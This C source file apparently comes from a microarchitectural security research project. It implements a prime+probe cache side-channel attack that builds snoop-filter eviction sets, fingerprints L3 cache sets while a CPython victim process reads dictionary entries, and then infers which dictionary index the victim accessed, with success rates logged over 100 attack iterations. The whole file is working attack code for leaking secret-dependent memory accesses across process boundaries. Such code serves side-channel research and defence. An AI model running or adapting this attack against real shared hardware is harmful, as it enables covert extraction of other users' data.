#include <pthread.h>
#include <stdbool.h>

#include "arch.h"
#include "config.h"
#include "cpython_runtime.h"
#include "fs.h"
#include "log.h"
#include "prime_probe.h"
#include "shared_memory.h"

#include <math.h>
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

enum { cache_line_count = 1, profile_iterations = 1 << 16 };
static uint64_t probe_time_arr[cache_line_count][profile_iterations];
static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];
static const int dict_entries = 1 << 16;
static const float factor = 0.75;

static const int target_entries = 4;
static const int dict_iterations = 32;
static const int attack_iterations = 100;
static const int window_margin_pct = 120;
static const int cali_num = 10;
static const int refine_rounds = 10;
static const int refine_min = 6;
static const int min_fingerprint_sets = 10;
static const double max_cross_similarity = 0.35;

static int discriminative_cap;
static uint64_t max_exec_cycles;

u32 *profiles = NULL;
f64 *expected_hits = NULL;
static config_t *cfg;
static int *targets, *select_all_mask, *select_all, select_all_num = 0;

static char replay_dir[512];
static FILE *replay_attack_fp = NULL;

static double cos_self_min = 1.0, cos_cross_max = 0.0;

static bool check(u32 ctr) {
	return (ctr >= dict_iterations * factor) &&
	       (ctr <= dict_iterations / factor);
}

static int qsort_int_lt(const void *a, const void *b) {
	int va = *(const int *)a;
	int vb = *(const int *)b;
	return (va > vb) - (va < vb);
}

static void release_victim(void) {
	pthread_barrier_wait(sync_ctx.barrier);
	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);
}

static u32 cpython_PS_profile_once(EVSet *evset, uint64_t max_exec_cycles) {
	uint64_t tsc0, tsc1;
	uint8_t *scope = evset->addrs[0];
	evchain *sf_chain = evchain_build(evset->addrs, SF_ASSOC);

	u64 scope_lat, end;
	u32 aux, index = 0;
	u32 l2_repeat = 1, array_repeat = 12;
	i64 threshold = detected_cache_lats.l2_thresh;

	prime_skx_sf_evset_ps_flush(evset, sf_chain, array_repeat, l2_repeat);

	/* log_info("profile start %lu", rdtscp()); */
	tsc0 = tsc1 = rdtscp();
	do {
		tsc1 = rdtscp();

		scope_lat = _time_maccess_aux(scope, end, aux);
		if (scope_lat > threshold) {
			if (scope_lat < detected_cache_lats.interrupt_thresh) {
				probe_time[0][index] = scope_lat;
				sample_tsc[0][index] = tsc1;
				index++;
			}
			prime_skx_sf_evset_ps_flush(
			    evset, sf_chain, array_repeat, l2_repeat);
		}
	} while (tsc1 - tsc0 < max_exec_cycles && index < profile_iterations);

	tsc1 = mfence_rdtscp();

	/* log_info("profile end %lu", tsc1); */
	log_trace("Client start done");
	return index;
}

static void profile(uint64_t i, int j) {
	*(uint64_t *)sync_ctx.data = i;
	for (int l3_set = 0; l3_set < cfg->l3.sets; ++l3_set) {
		if (l3_set % 1000 == 0) {
			log_info("profile set %d: L3 set: %d", j, l3_set);
		}
		EVSet *evset = get_sf_kth_evset(l3_set);
		if (evset) {
			*(uint64_t *)sync_ctx.data = i;
			sync_ctx_set_action(SYNC_CTX_PROBE);

			pthread_barrier_wait(sync_ctx.barrier);

			u32 res = cpython_PS_profile_once(evset, max_exec_cycles);

			pthread_barrier_wait(sync_ctx.barrier);

			if (sync_ctx_get_action() != SYNC_CTX_PAUSE) {
				log_warn("profile time/iteration too small (index %lu)", res);
			}

			profiles[j * cfg->l3.sets + l3_set] = res;
		} else {
			log_error("Cannot get evset for set %d", l3_set);
		}
	}
}

static void profile_selected(uint64_t i, int j, int *sel, int sel_num) {
	for (int idx = 0; idx < sel_num; ++idx) {
		int l3_set = sel[idx];
		EVSet *evset = get_sf_kth_evset(l3_set);
		if (evset) {
			*(uint64_t *)sync_ctx.data = i;
			sync_ctx_set_action(SYNC_CTX_PROBE);

			pthread_barrier_wait(sync_ctx.barrier);

			u32 res = cpython_PS_profile_once(evset, max_exec_cycles);

			pthread_barrier_wait(sync_ctx.barrier);

			if (sync_ctx_get_action() != SYNC_CTX_PAUSE) {
				log_warn("profile time/iteration too small (index %lu)", res);
			}

			profiles[j * cfg->l3.sets + l3_set] = res;
		} else {
			log_error("Cannot get evset for set %d", l3_set);
		}
	}
}

static double
selected_cos_similarity(int test_id, int exam_id, int *sel, int sel_num) {
	double dot = 0.0;
	double nx = 0.0;
	double ny = 0.0;

	for (size_t i = 0; i < sel_num; i++) {
		int slot0 = test_id * cfg->l3.sets + sel[i];
		int slot1 = exam_id * cfg->l3.sets + sel[i];
		double xi = (double)profiles[slot0];
		double yi = (double)expected_hits[slot1];
		dot += xi * yi;
		nx += xi * xi;
		ny += yi * yi;
	}

	double denom = sqrt(nx) * sqrt(ny);
	if (denom == 0.0)
		return 0.0;

	return dot / denom;
}

static double cos_target_thres = 1;

static inline int calibrate_cos_sim() {
	for (int i = 0; i < target_entries; ++i) {
		int **temp_hits = calloc(select_all_num, sizeof(int *));
		for (int j = 0; j < select_all_num; ++j)
			temp_hits[j] = calloc(cali_num, sizeof(int));
		for (int k = 0; k < cali_num; ++k) {
			profile_selected(targets[i], i, select_all, select_all_num);
			for (int j = 0; j < select_all_num; ++j) {
				int slot = i * cfg->l3.sets + select_all[j];
				temp_hits[j][k] = profiles[slot];
			}
		}
		for (int j = 0; j < select_all_num; ++j) {
			int slot = i * cfg->l3.sets + select_all[j];
			qsort(temp_hits[j], cali_num, sizeof(int), qsort_int_lt);
			expected_hits[slot] = (temp_hits[j][cali_num >> 1] +
			                       temp_hits[j][(cali_num - 1) >> 1]) /
			                      2.;
		}
		for (int j = 0; j < select_all_num; ++j)
			free(temp_hits[j]);
		free(temp_hits);
	}

	cos_self_min = 1.0;
	cos_cross_max = 0.0;
	for (int i = 0; i < target_entries; ++i) {
		double sim;
		for (int j = 0; j < target_entries; ++j) {
			sim = selected_cos_similarity(i, j, select_all, select_all_num);
			if (i == j) {
				cos_self_min = __min(cos_self_min, sim);
			} else {
				cos_cross_max = __max(cos_cross_max, sim);
			}
			log_info("Cos_sim(%d, %d)=%lf", i, j, sim);
		}
	}

	double auto_thres = (cos_self_min * 3 + cos_cross_max * 1) / 4;
	log_info("cos self min %lf, cos cross max %lf -> auto %lf",
	         cos_self_min,
	         cos_cross_max,
	         auto_thres);

	cos_target_thres = auto_thres;
	if (cos_target_thres < 0.5)
		cos_target_thres = 0.5;
	if (cos_target_thres > 0.999)
		cos_target_thres = 0.999;
	log_info("cos target threshold = %lf", cos_target_thres);

	if (cos_self_min <= cos_cross_max) {
		log_error("FINGERPRINTS DO NOT SEPARATE: self min %lf <= cross max %lf",
		          cos_self_min,
		          cos_cross_max);
		return 1;
	}
	if (cos_cross_max > max_cross_similarity) {
		log_error("FINGERPRINTS TOO ALIKE: cross max %lf > %lf",
		          cos_cross_max,
		          max_cross_similarity);
		return 1;
	}
	return 0;
}

static int infer_cos(int test_id) {
	double best_sim = 0;
	int choice = -1;
	for (int exam_id = 0; exam_id < target_entries; ++exam_id) {
		double sim_i = selected_cos_similarity(
		    test_id, exam_id, select_all, select_all_num);
		if (sim_i > best_sim) {
			best_sim = sim_i;
			choice = exam_id;
		}
		/* log_info("Sim(%d, %d)=%lf", test_id, exam_id, sim_i); */
	}
	log_info("Best sim %lf, choice %d", best_sim, choice);
	if (best_sim > cos_target_thres) {
		return choice;
	}
	return -1;
}

static void replay_open(void) {
	time_t now = time(NULL);
	struct tm tm_now;
	char stamp[32];
	localtime_r(&now, &tm_now);
	strftime(stamp, sizeof(stamp), "%Y%m%d_%H%M%S", &tm_now);
	snprintf(replay_dir, sizeof(replay_dir), "output/cpython_dict_%s", stamp);
	create_directory(replay_dir);

	char path[600];
	snprintf(path, sizeof(path), "%s/meta.txt", replay_dir);
	FILE *fp = fopen(path, "w");
	if (fp) {
		fprintf(fp, "target_entries\t%d\n", target_entries);
		fprintf(fp, "dict_iterations\t%d\n", dict_iterations);
		fprintf(fp, "dict_entries\t%d\n", dict_entries);
		fprintf(fp, "attack_iterations\t%d\n", attack_iterations);
		fprintf(fp, "max_exec_cycles\t%lu\n", max_exec_cycles);
		fprintf(fp, "band_low\t%d\n", (int)(dict_iterations * factor));
		fprintf(fp, "band_high\t%d\n", (int)(dict_iterations / factor));
		fprintf(fp, "l3_sets\t%lu\n", (unsigned long)cfg->l3.sets);
		fprintf(fp, "cali_num\t%d\n", cali_num);
		fprintf(fp, "refine_rounds\t%d\n", refine_rounds);
		fprintf(fp, "refine_min\t%d\n", refine_min);
		fprintf(fp, "discriminative_cap\t%d\n", discriminative_cap);
		fclose(fp);
	}
}

static void replay_dump_fingerprints(void) {
	char path[600];

	snprintf(path, sizeof(path), "%s/select_sets.txt", replay_dir);
	FILE *fp = fopen(path, "w");
	if (fp) {
		for (int j = 0; j < select_all_num; ++j) {
			fprintf(fp, "%d\n", select_all[j]);
		}
		fclose(fp);
	}

	snprintf(path, sizeof(path), "%s/targets.txt", replay_dir);
	fp = fopen(path, "w");
	if (fp) {
		for (int i = 0; i < target_entries; ++i) {
			fprintf(fp, "%d\t%d\n", i, targets[i]);
		}
		fclose(fp);
	}

	snprintf(path, sizeof(path), "%s/fingerprints.txt", replay_dir);
	fp = fopen(path, "w");
	if (fp) {
		for (int i = 0; i < target_entries; ++i) {
			fprintf(fp, "%d", i);
			for (int j = 0; j < select_all_num; ++j) {
				fprintf(fp,
				        "\t%.3f",
				        expected_hits[i * cfg->l3.sets + select_all[j]]);
			}
			fprintf(fp, "\n");
		}
		fclose(fp);
	}

	snprintf(path, sizeof(path), "%s/calibration.txt", replay_dir);
	fp = fopen(path, "w");
	if (fp) {
		fprintf(fp, "cos_self_min\t%.6f\n", cos_self_min);
		fprintf(fp, "cos_cross_max\t%.6f\n", cos_cross_max);
		fprintf(fp, "cos_target_thres\t%.6f\n", cos_target_thres);
		fprintf(fp, "select_all_num\t%d\n", select_all_num);
		fclose(fp);
	}

	snprintf(path, sizeof(path), "%s/attack.txt", replay_dir);
	replay_attack_fp = fopen(path, "w");
	if (replay_attack_fp) {
		fprintf(replay_attack_fp,
		        "iter\tkind\tdict_index\tgt_target\tvector\n");
		fflush(replay_attack_fp);
	}
}

static void replay_dump_attack(int iter,
                               const char *kind,
                               int dict_index,
                               int gt_target,
                               int slot) {
	if (!replay_attack_fp) {
		return;
	}
	fprintf(
	    replay_attack_fp, "%d\t%s\t%d\t%d", iter, kind, dict_index, gt_target);
	for (int j = 0; j < select_all_num; ++j) {
		fprintf(replay_attack_fp,
		        "\t%u",
		        profiles[slot * cfg->l3.sets + select_all[j]]);
	}
	fprintf(replay_attack_fp, "\n");
	fflush(replay_attack_fp);
}

int main(void) {
	srand(time(NULL));

	cfg = get_config();

	discriminative_cap = (int)round(sqrt((double)target_entries));
	max_exec_cycles = (uint64_t)dict_iterations * CPYTHON_EXTRA_WAITING_TIME *
	                  window_margin_pct / 100;

	log_info("config: targets=%d iters=%d band=[%d,%d] window=%lu attack=%d "
	         "cap=%d refine=%d/%d cali=%d",
	         target_entries,
	         dict_iterations,
	         (int)(dict_iterations * factor),
	         (int)(dict_iterations / factor),
	         max_exec_cycles,
	         attack_iterations,
	         discriminative_cap,
	         refine_min,
	         refine_rounds,
	         cali_num);
	log_warn("cpython_rt MUST be launched with iterations=%d", dict_iterations);

	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!");
		return 0;
	}

	for (int i = 0; i < cache_line_count; ++i) {
		sample_tsc[i] = sample_tsc_arr[i];
		probe_time[i] = probe_time_arr[i];
	}

	init_sync_ctx(CPYTHON_PROJ_ID);

	// Signal init done
	log_info("Signal init done");
	pthread_barrier_wait(sync_ctx.barrier);

	helper_thread_ctrl hctrl;

	if (LLCF_multi_evset(0, &hctrl)) {
		log_error("Failed to build evset");
		release_victim();
		return 4;
	}

	log_info("l2 thres %d, interrupt thres %d",
	         detected_cache_lats.l2_thresh,
	         detected_cache_lats.interrupt_thresh);

	if (start_helper_thread(&hctrl)) {
		log_error("Failed to start helper!");
		release_victim();
		return 4;
	}

	pthread_barrier_wait(sync_ctx.barrier);

	u32 l3_sets = cfg->l3.sets;
	u32 profile_size = l3_sets * (target_entries + 2);
	profiles = malloc(profile_size * sizeof(u32));
	memset(profiles, 0, profile_size * sizeof(u32));
	expected_hits = calloc(profile_size, sizeof(f64));

	replay_open();

	targets = calloc(target_entries, sizeof(int));
	for (int i = 0; i < target_entries; ++i) {
		int target = 0;
		bool found = false;
		do {
			target = rand() % dict_entries;
			found = false;
			for (int j = 0; j < i; ++j) {
				if (target == targets[j]) {
					found = true;
					break;
				}
			}
		} while (found);
		targets[i] = target;
		log_info("target %d = dict index %d", i, target);
	}

	select_all_mask = calloc(cfg->l3.sets, sizeof(int));
	select_all = calloc(cfg->l3.sets, sizeof(int));

	int *match_cnt = calloc(cfg->l3.sets, sizeof(int));
	int *cand = calloc(cfg->l3.sets, sizeof(int));
	int *cand_mask = calloc(cfg->l3.sets, sizeof(int));
	int *correlation = calloc(cfg->l3.sets, sizeof(int));
	// Profiling
	for (int i = 0; i < target_entries; ++i) {
		profile(targets[i], i);
		profile(targets[i], target_entries);
		printf("%d: [", i);
		for (int j = 0; j < cfg->l3.sets; ++j) {
			u32 ctr0 = profiles[i * cfg->l3.sets + j];
			u32 ctr1 = profiles[target_entries * cfg->l3.sets + j];

			if (check(ctr0) || check(ctr1)) {
				/* printf(", %5d %d %d\n", j, ctr0, ctr1); */
				printf(", %5d", j);
				cand_mask[j] = 1;
			}
		}
		printf("]\n");
	}

	int cand_num = 0;
	for (int i = 0; i < l3_sets; ++i) {
		if (cand_mask[i]) {
			cand[cand_num++] = i;
		}
	}
	log_info("candidate sets in band: %d", cand_num);

	if (cand_num == 0) {
		log_error("No candidate cache set fell in band [%d,%d]; evsets or "
		          "victim iteration count are wrong",
		          (int)(dict_iterations * factor),
		          (int)(dict_iterations / factor));
		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier);
		return 3;
	}

	// Filter
	if (refine_rounds == 0) {
		for (int c = 0; c < cand_num; ++c) {
			for (int i = 0; i < target_entries; ++i) {
				if (check(profiles[i * cfg->l3.sets + cand[c]])) {
					correlation[c] += 1;
				}
			}
		}
	}
	for (int i = 0; i < target_entries; ++i) {
		if (refine_rounds > 0) {
			memset(match_cnt, 0, cfg->l3.sets * sizeof(int));
			for (int k = 0; k < refine_rounds; k++) {
				profile_selected(targets[i], target_entries, cand, cand_num);
				for (int j = 0; j < cand_num; ++j) {
					u32 cnt = profiles[target_entries * cfg->l3.sets + cand[j]];
					match_cnt[j] += check(cnt);
				}
			}
			int activated = 0;
			for (int j = 0; j < cand_num; ++j) {
				if (match_cnt[j] >= refine_min) {
					correlation[j] += 1;
					activated++;
				}
			}
			log_info("target %d activates %d/%d candidate sets",
			         i,
			         activated,
			         cand_num);
		}
	}

	for (int i = 0; i < cand_num; ++i) {
		if (correlation[i] > 0 && correlation[i] <= discriminative_cap) {
			select_all_mask[cand[i]] = 1;
			log_info(
			    "chose %d %d (correlation %d)", i, cand[i], correlation[i]);
		}
	}

	for (int i = 0; i < cfg->l3.sets; ++i) {
		if (select_all_mask[i]) {
			select_all[select_all_num++] = i;
		}
	}
	free(select_all_mask);
	select_all_mask = NULL;

	log_info("fingerprint sets selected: %d / %d candidates",
	         select_all_num,
	         cand_num);

	if (select_all_num < min_fingerprint_sets) {
		log_error("Only %d fingerprint sets survived the filter, need %d "
		          "(cap=%d, refine %d/%d); rebuild evsets and retry",
		          select_all_num,
		          min_fingerprint_sets,
		          discriminative_cap,
		          refine_min,
		          refine_rounds);
		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier);
		return 3;
	}

	if (calibrate_cos_sim()) {
		log_error("Failed to calibrate cosine similarity");
		replay_dump_fingerprints();
		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier);
		return 2;
	}
	replay_dump_fingerprints();

	int target_success = 0;
	int target_access = 0;
	int access_success = 0;

	for (int i = 0; i < attack_iterations; ++i) {
		log_info("attack iteration: %d", i);

		// Hit
		int h = rand() % target_entries;
		profile_selected(
		    targets[h], target_entries, select_all, select_all_num);
		replay_dump_attack(i, "target", targets[h], h, target_entries);

		// Miss
		int nh = 0;
		bool found = false;
		do {
			nh = rand() % dict_entries;
			found = false;
			for (int j = 0; j < target_entries; ++j) {
				if (nh == targets[j]) {
					found = true;
					break;
				}
			}
		} while (found);
		profile_selected(nh, target_entries + 1, select_all, select_all_num);
		replay_dump_attack(i, "nontarget", nh, -1, target_entries + 1);

		log_info("Hit at target index %d (%d)", targets[h], h);
		int hi = infer_cos(target_entries);
		if (hi != -1) {
			target_access++;
		}
		if (hi == h) {
			target_success++;
			log_info("Correctly identfied target %d", h);
		} else {
			log_info("Incorrectly identfied target %d", hi);
		}

		log_info("Hit at non-target index %d", nh);
		int ni = infer_cos(target_entries + 1);
		if (ni == -1) {
			access_success++;
			log_info("Correctly identfied access");
		} else {
			log_info("Incorrectly identfied access %d", ni);
		}
	}

	log_info("Target success rate: %f",
	         (float)target_success / attack_iterations);
	log_info("Target access success rate: %f",
	         (float)target_access / attack_iterations);
	log_info("Access success rate: %f",
	         (float)access_success / attack_iterations);
	log_info("Replay data written to %s", replay_dir);

	if (replay_attack_fp) {
		fclose(replay_attack_fp);
	}

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);

	free(match_cnt);
	free(cand);
	free(cand_mask);
	free(correlation);
	free(select_all);
	free(targets);
	free(expected_hits);
	free(profiles);

	return 0;
}
